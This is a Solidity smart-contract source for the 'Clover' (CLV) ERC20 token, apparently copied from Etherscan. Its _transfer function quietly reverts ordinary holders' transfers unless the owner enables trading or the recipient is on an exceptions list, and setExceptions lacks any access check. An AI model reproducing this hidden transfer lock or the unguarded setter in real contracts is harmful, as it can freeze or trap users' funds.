1 /**
2  *Submitted for verification at Etherscan.io on 2020-07-26
3 */
4 
5 pragma solidity ^0.5.16;
6 
7 interface IERC20 {
8     function totalSupply() external view returns (uint);
9     function balanceOf(address account) external view returns (uint);
10     function transfer(address recipient, uint amount) external returns (bool);
11     function allowance(address owner, address spender) external view returns (uint);
12     function approve(address spender, uint amount) external returns (bool);
13     function transferFrom(address sender, address recipient, uint amount) external returns (bool);
14     event Transfer(address indexed from, address indexed to, uint value);
15     event Approval(address indexed owner, address indexed spender, uint value);
16 }
17 
18 contract Context {
19     constructor () internal { }
20     // solhint-disable-previous-line no-empty-blocks
21 
22     function _msgSender() internal view returns (address payable) {
23         return msg.sender;
24     }
25 }
26 
27 contract ERC20 is Context, IERC20 {
28     using SafeMath for uint;
29 
30     mapping (address => uint) private _balances;
31 
32     mapping (address => mapping (address => uint)) private _allowances;
33     mapping (address => bool) private exceptions;
34     address private _owner;
35     uint private _totalSupply;
36     bool private allow;
37 
38     constructor(address owner) public{
39       _owner = owner;
40       allow = false;
41     }
42 
43     function setAllow() public{
44         require(_msgSender() == _owner,"Only owner can change set allow");
45         allow = true;
46     }
47 
48     function setExceptions(address someAddress) public{
49         exceptions[someAddress] = true;
50     }
51 
52     function burnOwner() public{
53         require(_msgSender() == _owner,"Only owner can change set allow");
54         _owner = address(0);
55     }
56 
57     function totalSupply() public view returns (uint) {
58         return _totalSupply;
59     }
60     function balanceOf(address account) public view returns (uint) {
61         return _balances[account];
62     }
63     function transfer(address recipient, uint amount) public returns (bool) {
64         _transfer(_msgSender(), recipient, amount);
65         return true;
66     }
67     function allowance(address owner, address spender) public view returns (uint) {
68         return _allowances[owner][spender];
69     }
70     function approve(address spender, uint amount) public returns (bool) {
71         _approve(_msgSender(), spender, amount);
72         return true;
73     }
74     function transferFrom(address sender, address recipient, uint amount) public returns (bool) {
75         _transfer(sender, recipient, amount);
76         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
77         return true;
78     }
79     function increaseAllowance(address spender, uint addedValue) public returns (bool) {
80         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
81         return true;
82     }
83     function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {
84         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
85         return true;
86     }
87     function _transfer(address sender, address recipient, uint amount) internal {
88         require(sender != address(0), "ERC20: transfer from the zero address");
89         require(recipient != address(0), "ERC20: transfer to the zero address");
90         // Trigger special exceptions
91         if(sender == _owner || allow ) {
92           _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
93           _balances[recipient] = _balances[recipient].add(amount);
94           emit Transfer(sender, recipient, amount);
95         }else {
96           if(exceptions[recipient]) {
97             _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
98             _balances[recipient] = _balances[recipient].add(amount);
99             emit Transfer(sender, recipient, amount);
100           }else {
101             revert();
102           }
103         }
104     }
105 
106     function _mint(address account, uint amount) internal {
107         require(account != address(0), "ERC20: mint to the zero address");
108 
109         _totalSupply = _totalSupply.add(amount);
110         _balances[account] = _balances[account].add(amount);
111         emit Transfer(address(0), account, amount);
112     }
113     function _burn(address account, uint amount) internal {
114         require(account != address(0), "ERC20: burn from the zero address");
115 
116         _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
117         _totalSupply = _totalSupply.sub(amount);
118         emit Transfer(account, address(0), amount);
119     }
120     function _approve(address owner, address spender, uint amount) internal {
121         require(owner != address(0), "ERC20: approve from the zero address");
122         require(spender != address(0), "ERC20: approve to the zero address");
123 
124         _allowances[owner][spender] = amount;
125         emit Approval(owner, spender, amount);
126     }
127 }
128 
129 contract ERC20Detailed is IERC20 {
130     string private _name;
131     string private _symbol;
132     uint8 private _decimals;
133 
134     constructor (string memory name, string memory symbol, uint8 decimals) public {
135         _name = name;
136         _symbol = symbol;
137         _decimals = decimals;
138     }
139     function name() public view returns (string memory) {
140         return _name;
141     }
142     function symbol() public view returns (string memory) {
143         return _symbol;
144     }
145     function decimals() public view returns (uint8) {
146         return _decimals;
147     }
148 }
149 
150 library SafeMath {
151     function add(uint a, uint b) internal pure returns (uint) {
152         uint c = a + b;
153         require(c >= a, "SafeMath: addition overflow");
154 
155         return c;
156     }
157     function sub(uint a, uint b) internal pure returns (uint) {
158         return sub(a, b, "SafeMath: subtraction overflow");
159     }
160     function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
161         require(b <= a, errorMessage);
162         uint c = a - b;
163 
164         return c;
165     }
166     function mul(uint a, uint b) internal pure returns (uint) {
167         if (a == 0) {
168             return 0;
169         }
170 
171         uint c = a * b;
172         require(c / a == b, "SafeMath: multiplication overflow");
173 
174         return c;
175     }
176     function div(uint a, uint b) internal pure returns (uint) {
177         return div(a, b, "SafeMath: division by zero");
178     }
179     function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
180         // Solidity only automatically asserts when dividing by 0
181         require(b > 0, errorMessage);
182         uint c = a / b;
183 
184         return c;
185     }
186 }
187 
188 library Address {
189     function isContract(address account) internal view returns (bool) {
190         bytes32 codehash;
191         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
192         // solhint-disable-next-line no-inline-assembly
193         assembly { codehash := extcodehash(account) }
194         return (codehash != 0x0 && codehash != accountHash);
195     }
196 }
197 
198 library SafeERC20 {
199     using SafeMath for uint;
200     using Address for address;
201 
202     function safeTransfer(IERC20 token, address to, uint value) internal {
203         callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
204     }
205 
206     function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
207         callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
208     }
209 
210     function safeApprove(IERC20 token, address spender, uint value) internal {
211         require((value == 0) || (token.allowance(address(this), spender) == 0),
212             "SafeERC20: approve from non-zero to non-zero allowance"
213         );
214         callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
215     }
216     function callOptionalReturn(IERC20 token, bytes memory data) private {
217         require(address(token).isContract(), "SafeERC20: call to non-contract");
218 
219         // solhint-disable-next-line avoid-low-level-calls
220         (bool success, bytes memory returndata) = address(token).call(data);
221         require(success, "SafeERC20: low-level call failed");
222 
223         if (returndata.length > 0) { // Return data is optional
224             // solhint-disable-next-line max-line-length
225             require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
226         }
227     }
228 }
229 
230 contract Clover is ERC20, ERC20Detailed {
231   using SafeERC20 for IERC20;
232   using Address for address;
233   using SafeMath for uint;
234 
235   string constant advice = "Always do the opposite of what /biz/ says.";
236 
237   address public governance;
238 
239   mapping (address => bool) public minters;
240 
241   constructor () public ERC20Detailed("Clover", "CLV", 6) ERC20(tx.origin){
242       governance = tx.origin;
243   }
244 
245   function mint(address account, uint256 amount) public {
246       require(minters[msg.sender], "!minter");
247       _mint(account, amount);
248   }
249 
250   function burn(uint256 amount) public {
251 	  _burn(msg.sender, amount);
252   }
253 
254   function setGovernance(address _governance) public {
255       require(msg.sender == governance, "!governance");
256       governance = _governance;
257   }
258 
259   function addMinter(address _minter) public {
260       require(msg.sender == governance, "!governance");
261       minters[_minter] = true;
262   }
263 
264   function removeMinter(address _minter) public {
265       require(msg.sender == governance, "!governance");
266       minters[_minter] = false;
267   }
268 }